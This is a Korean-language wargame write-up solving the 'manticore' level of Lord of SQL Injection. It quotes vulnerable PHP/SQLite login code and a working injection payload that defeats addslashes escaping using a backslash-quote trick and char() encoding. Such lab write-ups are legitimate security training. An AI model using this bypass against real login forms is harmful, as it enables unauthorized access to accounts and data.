---
title: "[Lord of SQL Injection] LoS - manticore 문제풀이"
date: 2019-06-19
draft: false
category: [wargame]
subcategories: [lord-of-sql-injection]
tags: [Write-up, Lord of SQL Injection]
---

`SQLite`의 두 번째 문제이다.
이 번 문제도 간단한 편이다.  

<!--more-->

코드는 다음과 같다.  

```php
-----------------------------------------------------------------
query : select id from member where id='' and pw=''
-----------------------------------------------------------------

<?php
  include "./config.php";
  login_chk();
  $db = sqlite_open("./db/manticore.db");
  $_GET['id'] = addslashes($_GET['id']);
  $_GET['pw'] = addslashes($_GET['pw']);
  $query = "select id from member where id='{$_GET[id]}' and pw='{$_GET[pw]}'";
  echo "<hr>query : <strong>{$query}</strong><hr><br>";
  $result = sqlite_fetch_array(sqlite_query($db,$query));
  if($result['id'] == "admin") solve("manticore");
  highlight_file(__FILE__);
?>
```

언뜻 보면 이 전 문제랑 동일해 보인다.
그런데 이번에는 `addslashes`가 추가되어 있다.
처음엔 이걸 어떻게 풀어야 하나 고민했었다.
그러다 문득 든 생각이 `SQLite`에서 `\'`를 입력했을 때 과연 이걸 `\`와 `'`로 인식할까 혹은 `'`를 문자열 안에서 쓰기 위해 앞에 `\`를 삽입 한 것으로 인식할까였다.
그래서 인터넷에서 `SQLite`를 테스트 할 수 있는 사이트를 찾아 직접 실행 해 보았다.  

> [https://sqliteonline.com/](https://sqliteonline.com/)

위의 사이트에서 아래와 같이 입력 해 보았다.  

```mysql
SELECT '\'';
```

만약 `\'`를 `\`와 `'`로 인식한다면 오류가 날 것이고, `'`를 입력하기 위해 `\`를 사용한 것으로 인식한다면 `'`를 출력 할 것이다.
그 결과 아래와 같이 오류가 나는 것을 알 수 있었다.  

```plain
Uncaught Error: unrecognized token: "'\'';"
```

그리고 아까 입력 한 쿼리에서 `'`를 하나 빼면 정상적으로 `\`가 출력되었다.
즉, `addslashes`를 통해 `'` 앞에 `\`를 추가하더라도, 정상적으로 문자열을 닫을 수 있다.
그래서 문제를 풀기 위해 아래와 같은 쿼리를 사용했다.  

```plain
?id=a' or id=char(97,100,109,105,110) -- &pw=asd
```

완성되는 쿼리는 다음과 같다.  

```mysql
select id from member where id='a\' or id=char(97,100,109,105,110) -- ' and pw='asd'
```

`where`절만 살펴보면, 앞의 `id='a\'`는 `id`가 `a\`인 값을 찾는 조건이 된다.
`id`가 `a\`인 값은 없을 것이므로 `or` 뒤의 조건을 실행한다.
`id=char(97,100,109,105,110)`인데, `id='admin'`을 넣으면 `addslashes` 때문에 `id=\'admin\'`이 되기 때문에 `char()`을 사용해 `id`가 `admin`인 행을 추출하도록 했다.
이 후 뒤의 부분은 주석처리 되어 실행하지 않을 것이다.
위의 쿼리를 넘겨준 결과 문제를 풀 수 있었다.  

```php
-------------------------------------------------------------------------------------------------
query : select id from member where id='a\' or id=char(97,100,109,105,110) -- ' and pw='asd'
-------------------------------------------------------------------------------------------------

MANTICORE Clear!
<?php
  include "./config.php";
  login_chk();
  $db = sqlite_open("./db/manticore.db");
  $_GET['id'] = addslashes($_GET['id']);
  $_GET['pw'] = addslashes($_GET['pw']);
  $query = "select id from member where id='{$_GET[id]}' and pw='{$_GET[pw]}'";
  echo "<hr>query : <strong>{$query}</strong><hr><br>";
  $result = sqlite_fetch_array(sqlite_query($db,$query));
  if($result['id'] == "admin") solve("manticore");
  highlight_file(__FILE__);
?>
```

---

```plain
MANTICORE Clear!!
```